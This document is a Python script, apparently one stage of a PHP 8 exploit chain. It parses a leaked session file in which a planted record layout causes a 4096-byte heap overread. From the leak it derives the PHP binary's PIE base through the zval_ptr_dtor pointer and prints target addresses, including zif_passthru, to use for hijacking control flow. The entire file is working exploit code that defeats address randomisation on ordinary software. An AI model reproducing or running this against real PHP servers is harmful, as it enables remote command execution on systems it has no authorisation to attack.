#!/usr/bin/env python3
"""Parse the served session file leak and derive the PIE base.

The planted file made S (the first value zend_string) land on the G2 dtor slot
B0+0x10+16*U0.  Record order KEY(s:24) | J(i:4096) | X(s:24) | K(filler) |
a0(array) means the parsed zvals are written over S's header and over the
neighbouring heap:

  file bytes 0..25: [25]KEYNAME + "s:24:\"" (S value starts at 26)
  S zend_string header (0x2592a0):
    S+0x00 rec1 zval: value.ptr=S, type IS_STRING(6)
    S+0x10 rec2 zval: long 4096    -> S->len = 0x1000
    S+0x20 rec3 zval: X zend_string pointer
    S+0x30 rec4 zval: K filler zend_string pointer
    S+0x40 rec5 zval: a0 array HashTable pointer
  ZSTR_VAL(S) = S+0x18, so the 4096 byte overread payload starts in the
  middle of the rec2 zval and then walks the X/K/a0 zvals, the X value bytes,
  the array HashTable and its allocator neighbours.
"""
import struct
from pathlib import Path

R = Path('/tmp/opencode/research/php8pie_20261022_0325')
PATH = R / 'req/leak3_served.bin'
PIE_LO = 0x555000000000
PIE_HI = 0x558000000000
ZVAL_PTR_DTOR = 0x6644e5
ALIGN = 0x200000

LABELS = {
    0x00: 'rec2 J long value (4096 -> S->len)',
    0x08: 'rec3 X zend_string pointer',
    0x10: 'rec3 X zval type (0x106)',
    0x18: 'rec4 K zend_string pointer',
    0x20: 'rec4 K zval type (0x106)',
    0x28: 'rec5 a0 array HashTable pointer',
    0x30: 'rec5 a0 zval type (0x307)',
    0x38: 'X value bytes (24 x X)',
    0x58: 'HashTable gc',
    0x60: 'HashTable u',
    0x68: 'HashTable arData',
    0x70: 'HashTable nNumUsed / nNumOfElements',
    0x88: 'HashTable pDestructor = zval_ptr_dtor (PIE text)',
}


def main():
    data = PATH.read_bytes()
    marker = b's:4096:"'
    at = data.find(marker)
    print(f'file={PATH} size={len(data)}')
    print(f's:4096:" marker at {at}')
    if at < 0:
        raise SystemExit('leak marker not found')
    start = at + len(marker)
    payload = data[start:start + 4096]
    print(f'payload {start}..{start + 4096}')
    for off in range(0, 0x98, 8):
        value = struct.unpack_from('<Q', payload, off)[0]
        label = LABELS.get(off, '')
        print(f'  +0x{off:03x} = 0x{value:016x}  {label}')
    hits = []
    for off in range(0, 4096, 8):
        value = struct.unpack_from('<Q', payload, off)[0]
        if PIE_LO <= value < PIE_HI:
            hits.append((off, value))
    print(f'PIE-range qwords in the 4096 byte payload: {len(hits)}')
    for off, value in hits:
        base = value - ZVAL_PTR_DTOR
        print(f'  +0x{off:03x} = 0x{value:016x} '
              f'-> base 0x{base:016x} aligned={base % ALIGN == 0}')
    if len(hits) != 1:
        raise SystemExit('expected exactly one PIE pointer in the overread')
    off, value = hits[0]
    base = value - ZVAL_PTR_DTOR
    if base % ALIGN:
        raise SystemExit('derived base is not 2 MB aligned')
    print(f'DERIVED_BASE 0x{base:x}')
    print(f'DECODE_SLOT 0x{base + 0x10c1980:x}')
    print(f'ZIF_PASSTHRU 0x{base + 0x464c15:x}')


if __name__ == '__main__':
    main()
